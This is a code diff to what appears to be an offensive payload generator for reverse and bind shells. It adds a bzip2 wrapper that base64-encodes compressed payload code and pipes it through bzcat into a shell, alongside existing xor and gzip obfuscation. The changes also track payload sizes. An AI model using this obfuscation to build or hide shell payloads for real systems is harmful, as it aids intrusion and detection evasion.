@@ -1,4 +1,4 @@
-from encoders import powershell_base64, xor, gzip_compress, to_unicode, to_urlencode
+from encoders import powershell_base64, xor, gzip_compress, bzip2_compress, to_unicode, to_urlencode
 from binascii import hexlify
 from binary import shellcode_to_hex, shellcode_to_ps1, WINDOWS_BLOODSEEKER_SCRIPT # imported since 0.3.6
 from sys import exit
@@ -107,13 +107,24 @@ def xor_wrapper(name, code, args, shell="/bin/bash"):
     return code
 
 
-def gzip_wrapper(name, code, args, shell="/bin/bash"):
-    if args.shell is not "":
-        shell = args.shell
-    if args.gzip is True:
+def gzip_wrapper(code, args):
+    shell = args.shell
+
+    if args.gzip:
         code = gzip_compress(code)
         code = code.encode("base64").replace("\n", "")
         code = "echo {0}|base64 -d|gunzip -c|{1}".format(code, shell)
+
+    return code
+
+def bzip2_wrapper(code, args):
+    shell = args.shell
+
+    if args.bzip2:
+        code = bzip2_compress(code)
+        code = code.encode("base64").replace("\n", "")
+        code = "echo {0}|base64 -d|bzcat|{1}".format(code, shell)
+
     return code
 
 
@@ -166,6 +177,10 @@ class Shell(object):
         self.handler = None if use_handler is None else use_handler # this is going to be the handler function.
         self.handler_args = None # this is going to be set during execution.
 
+        # Attributes that are used to print stats about payload's size
+        self.decompSize = None
+        self.compSize = None
+
         self.use_http_stager = False if use_http_stager is None else use_http_stager
         return
     
@@ -180,6 +195,8 @@ class ReverseShell(object):
         self.host = args.host
         self.port = args.port
         self.code = code
+        self.decompSize = None
+        self.compSize = None
         self.payload = str()  # this is where the final code is stored.
 
     def get(self):
@@ -227,8 +244,15 @@ class ReverseShell(object):
         # Apply xor encoding.
         self.code = self.code if self.args.xor is 0 else xor_wrapper(self.name, self.code, self.args)
 
+        self.decompSize = len(self.code)
+
         # Apply gzip compression
-        self.code = gzip_wrapper(self.name, self.code, self.args)
+        self.code = gzip_wrapper(self.code, self.args)
+
+        # Apply bzip2 compression
+        self.code = bzip2_wrapper(self.code, self.args)
+
+        self.compSize = len(self.code)
 
         # Apply base64 encoding.
         self.code = base64_wrapper(self.name, self.code, self.args)
@@ -246,6 +270,8 @@ class BindShell(object):
         self.args = args
         self.port = args.port
         self.code = code
+        self.decompSize = None
+        self.compSize = None
         self.payload = str() # this is where the final code is stored.
 
     def get(self):
@@ -262,8 +288,15 @@ class BindShell(object):
         # Apply xor encoding.
         self.code = self.code if self.args.xor is 0 else xor_wrapper(self.name, self.code, self.args)
 
+        self.decompSize = len(self.code)
+
         # Apply gzip compression
-        self.code = gzip_wrapper(self.name, self.code, self.args)
+        self.code = gzip_wrapper(self.code, self.args)
+
+        # Apply bzip2 compression
+        self.code = bzip2_wrapper(self.code, self.args)
+
+        self.compSize = len(self.code)
 
         # Apply base64 encoding.
         self.code = base64_wrapper(self.name, self.code, self.args)
